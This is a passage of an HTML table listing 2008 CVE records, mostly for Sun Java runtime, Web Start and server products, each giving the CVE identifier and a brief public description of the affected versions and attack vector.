		<td valign="top">Java Runtime Environment (JRE) for Sun JDK and JRE 6 Update 10 and earlier might allow remote attackers to execute arbitrary code via a crafted GIF file that triggers memory corruption during display of the splash screen, possibly related to splashscreen.dll.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5357">CVE-2008-5357</a></td>
		<td valign="top">Integer overflow in Java Runtime Environment (JRE) for Sun JDK and JRE 6 Update 10 and earlier; JDK and JRE 5.0 Update 16 and earlier; SDK and JRE 1.4.2_18 and earlier; and SDK and JRE 1.3.1_23 and earlier might allow remote attackers to execute arbitrary code via a crafted TrueType font file, which triggers a heap-based buffer overflow.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5356">CVE-2008-5356</a></td>
		<td valign="top">Heap-based buffer overflow in Java Runtime Environment (JRE) for Sun JDK and JRE 6 Update 10 and earlier; JDK and JRE 5.0 Update 16 and earlier; and SDK and JRE 1.4.2_18 and earlier might allow remote attackers to execute arbitrary code via a crafted TrueType font file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5355">CVE-2008-5355</a></td>
		<td valign="top">The "Java Update" feature for Java Runtime Environment (JRE) for Sun JDK and JRE 6 Update 10 and earlier; JDK and JRE 5.0 Update 16 and earlier; and SDK and JRE 1.4.2_18 and earlier does not verify the signature of the JRE that is downloaded, which allows remote attackers to execute arbitrary code via DNS man-in-the-middle attacks.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5354">CVE-2008-5354</a></td>
		<td valign="top">Stack-based buffer overflow in Java Runtime Environment (JRE) for Sun JDK and JRE 6 Update 10 and earlier; JDK and JRE 5.0 Update 16 and earlier; and SDK and JRE 1.4.2_18 and earlier allows locally-launched and possibly remote untrusted Java applications to execute arbitrary code via a JAR file with a long Main-Class manifest entry.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5353">CVE-2008-5353</a></td>
		<td valign="top">The Java Runtime Environment (JRE) for Sun JDK and JRE 6 Update 10 and earlier; JDK and JRE 5.0 Update 16 and earlier; and SDK and JRE 1.4.2_18 and earlier does not properly enforce context of ZoneInfo objects during deserialization, which allows remote attackers to run untrusted applets and applications in a privileged context, as demonstrated by "deserializing Calendar objects".

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5352">CVE-2008-5352</a></td>
		<td valign="top">Integer overflow in the JAR unpacking utility (unpack200) in the unpack library (unpack.dll) in Java Runtime Environment (JRE) for Sun JDK and JRE 6 Update 10 and earlier, and JDK and JRE 5.0 Update 16 and earlier, allows untrusted applications and applets to gain privileges via a Pack200 compressed JAR file that triggers a heap-based buffer overflow.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5351">CVE-2008-5351</a></td>
		<td valign="top">Java Runtime Environment (JRE) for Sun JDK and JRE 6 Update 10 and earlier; JDK and JRE 5.0 Update 16 and earlier; and SDK and JRE 1.4.2_18 and earlier accepts UTF-8 encodings that are not the "shortest" form, which makes it easier for attackers to bypass protection mechanisms for other applications that rely on shortest-form UTF-8 encodings.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5350">CVE-2008-5350</a></td>
		<td valign="top">Unspecified vulnerability in Java Runtime Environment (JRE) for Sun JDK and JRE 6 Update 10 and earlier; JDK and JRE 5.0 Update 16 and earlier; and SDK and JRE 1.4.2_18 and earlier allows untrusted applications and applets to list the contents of the operating user's directory via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5349">CVE-2008-5349</a></td>
		<td valign="top">Unspecified vulnerability in Java Runtime Environment (JRE) for Sun JDK and JRE 6 Update 10 and earlier, and JDK and JRE 5.0 Update 16 and earlier, allows remote attackers to cause a denial of service (CPU consumption) via a crafted RSA public key.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5348">CVE-2008-5348</a></td>
		<td valign="top">Unspecified vulnerability in Java Runtime Environment (JRE) for Sun JDK and JRE 6 Update 10 and earlier; JDK and JRE 5.0 Update 16 and earlier; and SDK and JRE 1.4.2_18 and earlier, when using Kerberos authentication, allows remote attackers to cause a denial of service (OS resource consumption) via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5347">CVE-2008-5347</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in Java Runtime Environment (JRE) for Sun JDK and JRE 6 Update 10 and earlier allow untrusted applets and applications to gain privileges via vectors related to access to inner classes in the (1) JAX-WS and (2) JAXB packages.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5346">CVE-2008-5346</a></td>
		<td valign="top">Unspecified vulnerability in Java Runtime Environment (JRE) for Sun JDK and JRE 5.0 Update 16 and earlier; SDK and JRE 1.4.2_18 and earlier; and SDK and JRE 1.3.1_23 or earlier allows untrusted applets and applications to read arbitrary memory via a crafted ZIP file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5345">CVE-2008-5345</a></td>
		<td valign="top">Unspecified vulnerability in Java Runtime Environment (JRE) with Sun JDK and JRE 6 Update 10 and earlier; JDK and JRE 5.0 Update 16 and earlier; SDK and JRE 1.4.2_18 and earlier; and SDK and JRE 1.3.1_23 and earlier allows code that is loaded from a local filesystem to read arbitrary files and make unauthorized connections to localhost via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5344">CVE-2008-5344</a></td>
		<td valign="top">Unspecified vulnerability in Java Web Start (JWS) and Java Plug-in with Sun JDK and JRE 6 Update 10 and earlier; JDK and JRE 5.0 Update 16 and earlier; and SDK and JRE 1.4.2_18 and earlier allows untrusted applets to read arbitrary files and make unauthorized network connections via unknown vectors related to applet classloading, aka 6716217.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5343">CVE-2008-5343</a></td>
		<td valign="top">Java Web Start (JWS) and Java Plug-in with Sun JDK and JRE 6 Update 10 and earlier; JDK and JRE 5.0 Update 16 and earlier; and SDK and JRE 1.4.2_18 and earlier allows remote attackers to make unauthorized network connections and hijack HTTP sessions via a crafted file that validates as both a GIF and a Java JAR file, aka "GIFAR" and CR 6707535.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5342">CVE-2008-5342</a></td>
		<td valign="top">Unspecified vulnerability in the BasicService for Java Web Start (JWS) and Java Plug-in with Sun JDK and JRE 6 Update 10 and earlier; JDK and JRE 5.0 Update 16 and earlier; and SDK and JRE 1.4.2_18 and earlier allows untrusted downloaded applications to cause local files to be displayed in the browser of the user of the untrusted application via unknown vectors, aka 6767668.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5341">CVE-2008-5341</a></td>
		<td valign="top">Unspecified vulnerability in Java Web Start (JWS) and Java Plug-in with Sun JDK and JRE 6 Update 10 and earlier, and JDK and JRE 5.0 Update 16 and earlier, allows untrusted JWS applications to obtain the pathname of the JWS cache and the application username via unknown vectors, aka CR 6727071.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5340">CVE-2008-5340</a></td>
		<td valign="top">Unspecified vulnerability in Java Web Start (JWS) and Java Plug-in with Sun JDK and JRE 6 Update 10 and earlier; JDK and JRE 5.0 Update 16 and earlier; and SDK and JRE 1.4.2_18 and earlier allows untrusted JWS applications to gain privileges to access local files or applications via unknown vectors, aka 6727081.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5339">CVE-2008-5339</a></td>
		<td valign="top">Unspecified vulnerability in Java Web Start (JWS) and Java Plug-in with Sun JDK and JRE 6 Update 10 and earlier; JDK and JRE 5.0 Update 16 and earlier; and SDK and JRE 1.4.2_18 and earlier allows untrusted JWS applications to perform network connections to unauthorized hosts via unknown vectors, aka CR 6727079.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5266">CVE-2008-5266</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in configuration/httpListenerEdit.jsf in the GlassFish 2 UR2 b04 webadmin interface in Sun Java System Application Server 9.1_01 build b09d-fcs and 9.1_02 build b04-fcs allows remote attackers to inject arbitrary web script or HTML via the name parameter, a different vector than CVE-2008-2751.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5118">CVE-2008-5118</a></td>
		<td valign="top">Sun Java System Identity Manager 6.0 through 6.0 SP4, 7.0, and 7.1 allows remote attackers to inject frames from arbitrary web sites and conduct phishing attacks via unspecified vectors, related to "frame injection."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5117">CVE-2008-5117</a></td>
		<td valign="top">Open redirect vulnerability in Sun Java System Identity Manager 6.0 through 6.0 SP4, 7.0, and 7.1 allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5116">CVE-2008-5116</a></td>
		<td valign="top">Directory traversal vulnerability in idm/includes/helpServer.jsp in Sun Java System Identity Manager 6.0 through 6.0 SP4, 7.0, and 7.1 allows remote attackers to read arbitrary files in the filesystem of the IDM server via directory traversal sequences in the ext parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5115">CVE-2008-5115</a></td>
		<td valign="top">Cross-site request forgery (CSRF) vulnerability in Sun Java System Identity Manager 6.0 through 6.0 SP4, 7.0, and 7.1 allows remote attackers to hijack the authentication of administrators for requests that update the password via idm/admin/changeself.jsp.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5114">CVE-2008-5114</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in Sun Java System Identity Manager 6.0 through 6.0 SP4, 7.0, and 7.1 allow remote attackers to inject arbitrary web script or HTML via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5098">CVE-2008-5098</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in Sun Java System Messaging Server 6.2 and 6.3 allows remote attackers to inject arbitrary web script or HTML via unspecified vectors, a different vulnerability than CVE-2007-2904.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-4910">CVE-2008-4910</a></td>
		<td valign="top">The BasicService in Sun Java Web Start allows remote attackers to execute arbitrary programs on a client machine via a file:// URL argument to the showDocument method.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-4828">CVE-2008-4828</a></td>
		<td valign="top">Multiple stack-based buffer overflows in dsmagent.exe in the Remote Agent Service in the IBM Tivoli Storage Manager (TSM) client 5.1.0.0 through 5.1.8.2, 5.2.0.0 through 5.2.5.3, 5.3.0.0 through 5.3.6.4, and 5.4.0.0 through 5.4.1.96, and the TSM Express client 5.3.3.0 through 5.3.6.4, allow remote attackers to execute arbitrary code via (1) a request packet that is not properly parsed by an unspecified "generic string handling function" or (2) a crafted NodeName in a dicuGetIdentifyRequest request packet, related to the (a) Web GUI and (b) Java GUI.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-4747">CVE-2008-4747</a></td>
		<td valign="top">Unspecified vulnerability in the search feature in Sun Java System LDAP JDK before 4.20 allows context-dependent attackers to obtain sensitive information via unknown attack vectors related to the LDAP JDK library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-4695">CVE-2008-4695</a></td>
		<td valign="top">Opera before 9.60 allows remote attackers to obtain sensitive information and have unspecified other impact by predicting the cache pathname of a cached Java applet and then launching this applet from the cache, leading to applet execution within the local-machine context.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-4679">CVE-2008-4679</a></td>
		<td valign="top">The Web Services Security component in IBM WebSphere Application Server (WAS) 6.0.2 before 6.0.2.31 and 6.1 before 6.1.0.19, when Certificate Store Collections is configured to use Certificate Revocation Lists (CRL), does not call the setRevocationEnabled method on the PKIXBuilderParameters object, which prevents the "Java security method" from checking the revocation status of X.509 certificates and allows remote attackers to bypass intended access restrictions via a SOAP message with a revoked certificate.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-4541">CVE-2008-4541</a></td>
		<td valign="top">Heap-based buffer overflow in the FTP subsystem in Sun Java System Web Proxy Server 4.0 through 4.0.7 allows remote attackers to execute arbitrary code via a crafted HTTP GET request.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-4410">CVE-2008-4410</a></td>
		<td valign="top">The vmi_write_ldt_entry function in arch/x86/kernel/vmi_32.c in the Virtual Machine Interface (VMI) in the Linux kernel 2.6.26.5 invokes write_idt_entry where write_ldt_entry was intended, which allows local users to cause a denial of service (persistent application failure) via crafted function calls, related to the Java Runtime Environment (JRE) experiencing improper LDT selector state, a different vulnerability than CVE-2008-3247.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-4385">CVE-2008-4385</a></td>
		<td valign="top">Husdawg, LLC Systems Requirements Lab 3, as used by Instant Expert Analysis, allows remote attackers to force the download and execution of arbitrary programs via by specifiying a malicious website argument to the Init method in (1) a certain ActiveX control (sysreqlab2.cab, sysreqlab.dll, sysreqlabsli.dll, or sysreqlab2.dll) and (2) a certain Java applet in RLApplet.class in sysreqlab2.jar or sysreqlab.jar.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-4368">CVE-2008-4368</a></td>
		<td valign="top">The default configuration of Java 1.5 on Apple Mac OS X 10.5.4 and 10.5.5 contains a jurisdiction policy that limits Java Cryptography Extension (JCE) key sizes to 128 bits, which makes it easier for attackers to decrypt ciphertext produced by JCE.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-4339">CVE-2008-4339</a></td>
		<td valign="top">Unspecified vulnerability in the Java Administration GUI (jnbSA) in Symantec Veritas NetBackup Server and NetBackup Enterprise Server 5.1 before MP7, 6.0 before MP7, and 6.5 before 6.5.2 allows remote authenticated users to gain privileges via unknown attack vectors related to "bpjava* binaries."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3683">CVE-2008-3683</a></td>
		<td valign="top">Unspecified vulnerability in the FTP subsystem in Sun Java System Web Proxy Server 4.0 through 4.0.5 before SP6 allows remote attackers to cause a denial of service (failure to accept connections) via unknown vectors, probably related to exhaustion of file descriptors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3638">CVE-2008-3638</a></td>
		<td valign="top">Java on Apple Mac OS X 10.5.4 and 10.5.5 does not prevent applets from accessing file:// URLs, which allows remote attackers to execute arbitrary programs.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3637">CVE-2008-3637</a></td>
		<td valign="top">The Hash-based Message Authentication Code (HMAC) provider in Java on Apple Mac OS X 10.4.11, 10.5.4, and 10.5.5 uses an uninitialized variable, which allows remote attackers to execute arbitrary code via a crafted applet, related to an "error checking issue."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3551">CVE-2008-3551</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in Sun Java Platform Micro Edition (aka Java ME, J2ME, or mobile Java), as distributed in Sun Wireless Toolkit 2.5.2, allow remote attackers to execute arbitrary code via unknown vectors.  NOTE: as of 20080807, the only disclosure is a vague pre-advisory with no actionable information. However, because it is from a company led by a well-known researcher, it is being assigned a CVE identifier for tracking purposes.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3440">CVE-2008-3440</a></td>
		<td valign="top">Sun Java 1.6.0_03 and earlier versions, and possibly later versions, does not properly verify the authenticity of updates, which allows man-in-the-middle attackers to execute arbitrary code via a Trojan horse update, as demonstrated by evilgrade and DNS cache poisoning.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3425">CVE-2008-3425</a></td>
		<td valign="top">Unspecified vulnerability in the Sun Java System Web Server 7.0 plugin in Sun N1 Service Provisioning System (SPS) 5.2 and 6.0 allows remote authenticated SPS users to gain administrative access to the web server via unknown attack vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3115">CVE-2008-3115</a></td>
		<td valign="top">Secure Static Versioning in Sun Java JDK and JRE 6 Update 6 and earlier, and 5.0 Update 6 through 15, does not properly prevent execution of applets on older JRE releases, which might allow remote attackers to exploit vulnerabilities in these older releases.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3114">CVE-2008-3114</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java Web Start in JDK and JRE 6 before Update 7, JDK and JRE 5.0 before Update 16, and SDK and JRE 1.4.x before 1.4.2_18 allows context-dependent attackers to obtain sensitive information (the cache location) via an untrusted application, aka CR 6704074.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3113">CVE-2008-3113</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java Web Start in JDK and JRE 5.0 before Update 16 and SDK and JRE 1.4.x before 1.4.2_18 allows remote attackers to create or delete arbitrary files via an untrusted application, aka CR 6704077.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3112">CVE-2008-3112</a></td>
		<td valign="top">Directory traversal vulnerability in Sun Java Web Start in JDK and JRE 6 before Update 7, JDK and JRE 5.0 before Update 16, and SDK and JRE 1.4.x before 1.4.2_18 allows remote attackers to create arbitrary files via the writeManifest method in the CacheEntry class, aka CR 6703909.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3111">CVE-2008-3111</a></td>
		<td valign="top">Multiple buffer overflows in Sun Java Web Start in JDK and JRE 6 before Update 4, JDK and JRE 5.0 before Update 16, and SDK and JRE 1.4.x before 1.4.2_18 allow context-dependent attackers to gain privileges via an untrusted application, as demonstrated by (a) an application that grants itself privileges to (1) read local files, (2) write to local files, or (3) execute local programs; and as demonstrated by (b) a long value associated with a java-vm-args attribute in a j2se tag in a JNLP file, which triggers a stack-based buffer overflow in the GetVMArgsOption function; aka CR 6557220.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3110">CVE-2008-3110</a></td>
		<td valign="top">Unspecified vulnerability in scripting language support in Sun Java Runtime Environment (JRE) in JDK and JRE 6 Update 6 and earlier allows remote attackers to obtain sensitive information by using an applet to read information from another applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3109">CVE-2008-3109</a></td>
		<td valign="top">Unspecified vulnerability in scripting language support in Sun Java Runtime Environment (JRE) in JDK and JRE 6 Update 6 and earlier allows context-dependent attackers to gain privileges via an untrusted (1) application or (2) applet, as demonstrated by an application or applet that grants itself privileges to (a) read local files, (b) write to local files, or (c) execute local programs.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3108">CVE-2008-3108</a></td>
		<td valign="top">Buffer overflow in Sun Java Runtime Environment (JRE) in JDK and JRE 5.0 before Update 10, SDK and JRE 1.4.x before 1.4.2_18, and SDK and JRE 1.3.x before 1.3.1_23 allows context-dependent attackers to gain privileges via unspecified vectors related to font processing.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3107">CVE-2008-3107</a></td>
		<td valign="top">Unspecified vulnerability in the Virtual Machine in Sun Java Runtime Environment (JRE) in JDK and JRE 6 before Update 7, JDK and JRE 5.0 before Update 16, and SDK and JRE 1.4.x before 1.4.2_18 allows context-dependent attackers to gain privileges via an untrusted (1) application or (2) applet, as demonstrated by an application or applet that grants itself privileges to (a) read local files, (b) write to local files, or (c) execute local programs.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3106">CVE-2008-3106</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java Runtime Environment (JRE) in JDK and JRE 6 Update 6 and earlier and JDK and JRE 5.0 Update 15 and earlier allows remote attackers to access URLs via unknown vectors involving processing of XML data by an untrusted (1) application or (2) applet, a different vulnerability than CVE-2008-3105.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3105">CVE-2008-3105</a></td>
		<td valign="top">Unspecified vulnerability in the JAX-WS client and service in Sun Java Runtime Environment (JRE) in JDK and JRE 6 Update 6 and earlier allows remote attackers to access URLs or cause a denial of service via unknown vectors involving "processing of XML data" by a trusted application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3104">CVE-2008-3104</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in Sun Java Runtime Environment (JRE) in JDK and JRE 6 before Update 7, JDK and JRE 5.0 before Update 16, SDK and JRE 1.4.x before 1.4.2_18, and SDK and JRE 1.3.x before 1.3.1_23 allow remote attackers to violate the security model for an applet's outbound connections by connecting to localhost services running on the machine that loaded the applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-3103">CVE-2008-3103</a></td>
		<td valign="top">Unspecified vulnerability in the Java Management Extensions (JMX) management agent in Sun Java Runtime Environment (JRE) in JDK and JRE 6 Update 6 and earlier and JDK and JRE 5.0 Update 15 and earlier, when local monitoring is enabled, allows remote attackers to "perform unauthorized operations" via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2945">CVE-2008-2945</a></td>
		<td valign="top">Sun Java System Access Manager 6.3 through 7.1 and Sun Java System Identity Server 6.1 and 6.2 do not properly process XSLT stylesheets in XSLT transforms in XML signatures, which allows context-dependent attackers to execute arbitrary code via a crafted stylesheet, a related issue to CVE-2007-3715, CVE-2007-3716, and CVE-2007-4289.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2806">CVE-2008-2806</a></td>
		<td valign="top">Mozilla Firefox before 2.0.0.15 and SeaMonkey before 1.1.10 on Mac OS X allow remote attackers to bypass the Same Origin Policy and create arbitrary socket connections via a crafted Java applet, related to the Java Embedding Plugin (JEP) and Java LiveConnect.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2751">CVE-2008-2751</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in the Glassfish webadmin interface in Sun Java System Application Server 9.1_01 allow remote attackers to inject arbitrary web script or HTML via the (1) propertyForm:propertyContentPage:propertySheet:propertSectionTextField:jndiProp:JndiNew, (2) propertyForm:propertyContentPage:propertySheet:propertSectionTextField:resTypeProp:resType, (3) propertyForm:propertyContentPage:propertySheet:propertSectionTextField:factoryClassProp:factoryClass, or (4) propertyForm:propertyContentPage:propertySheet:propertSectionTextField:descProp:desc parameter to (a) resourceNode/customResourceNew.jsf; the (5) propertyForm:propertyContentPage:propertySheet:propertSectionTextField:jndiProp:JndiNew, (6) propertyForm:propertyContentPage:propertySheet:propertSectionTextField:resTypeProp:resType, (7) propertyForm:propertyContentPage:propertySheet:propertSectionTextField:factoryClassProp:factoryClass, (8) propertyForm:propertyContentPage:propertySheet:propertSectionTextField:jndiLookupProp:jndiLookup, or (9) propertyForm:propertyContentPage:propertySheet:propertSectionTextField:descProp:desc parameter to (b) resourceNode/externalResourceNew.jsf; the (10) propertyForm:propertySheet:propertSectionTextField:jndiProp:Jndi, (11) propertyForm:propertySheet:propertSectionTextField:nameProp:name, or (12) propertyForm:propertySheet:propertSectionTextField:descProp:desc parameter to (c) resourceNode/jmsDestinationNew.jsf; the (13) propertyForm:propertySheet:generalPropertySheet:jndiProp:Jndi or (14) propertyForm:propertySheet:generalPropertySheet:descProp:cd parameter to (d) resourceNode/jmsConnectionNew.jsf; the (15) propertyForm:propertySheet:propertSectionTextField:jndiProp:jnditext or (16) propertyForm:propertySheet:propertSectionTextField:descProp:desc parameter to (e) resourceNode/jdbcResourceNew.jsf; the (17) propertyForm:propertyContentPage:propertySheet:propertSectionTextField:nameProp:name, (18) propertyForm:propertyContentPage:propertySheet:propertSectionTextField:classNameProp:classname, or (19) propertyForm:propertyContentPage:propertySheet:propertSectionTextField:loadOrderProp:loadOrder parameter to (f) applications/lifecycleModulesNew.jsf; or the (20) propertyForm:propertyContentPage:propertySheet:generalPropertySheet:jndiProp:name, (21) propertyForm:propertyContentPage:propertySheet:generalPropertySheet:resTypeProp:resType, or (22) propertyForm:propertyContentPage:propertySheet:generalPropertySheet:dbProp:db parameter to (g) resourceNode/jdbcConnectionPoolNew1.jsf.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2749">CVE-2008-2749</a></td>
		<td valign="top">Unspecified vulnerability in cshttpd in Sun Java System Calendar Server 6 and 6.3, and Sun ONE Calendar Server 6.0, when access logging (aka service.http.commandlog.all) is enabled, allows remote attackers to cause a denial of service (daemon crash) via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2705">CVE-2008-2705</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java System Access Manager (AM) 7.1, when used with certain versions and configurations of Sun Directory Server Enterprise Edition (DSEE), allows remote attackers to bypass authentication via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2518">CVE-2008-2518</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in the advanced search mechanism (webapps/search/advanced.jsp) in Sun Java System Web Server 6.1 before SP9 and 7.0 before Update 3 allows remote attackers to inject arbitrary web script or HTML via unspecified vectors, probably related to the next parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2419">CVE-2008-2419</a></td>
		<td valign="top">Mozilla Firefox 2.0.0.14 allows remote attackers to cause a denial of service (heap corruption and application crash) or possibly execute arbitrary code by triggering an error condition during certain Iframe operations between a JSframe write and a JSframe close, as demonstrated by an error in loading an empty Java applet defined by a 'src="javascript:"' sequence.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2406">CVE-2008-2406</a></td>
		<td valign="top">The administration application server in Sun Java Active Server Pages (ASP) Server before 4.0.3 allows remote attackers to bypass authentication via direct requests on TCP port 5102.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2405">CVE-2008-2405</a></td>
		<td valign="top">Sun Java Active Server Pages (ASP) Server before 4.0.3 allows remote attackers to execute arbitrary commands via shell metacharacters in HTTP requests to unspecified ASP applications.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2404">CVE-2008-2404</a></td>
		<td valign="top">Stack-based buffer overflow in the request handling implementation in Sun Java Active Server Pages (ASP) Server before 4.0.3 allows remote attackers to execute arbitrary code via an unspecified string field.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2403">CVE-2008-2403</a></td>
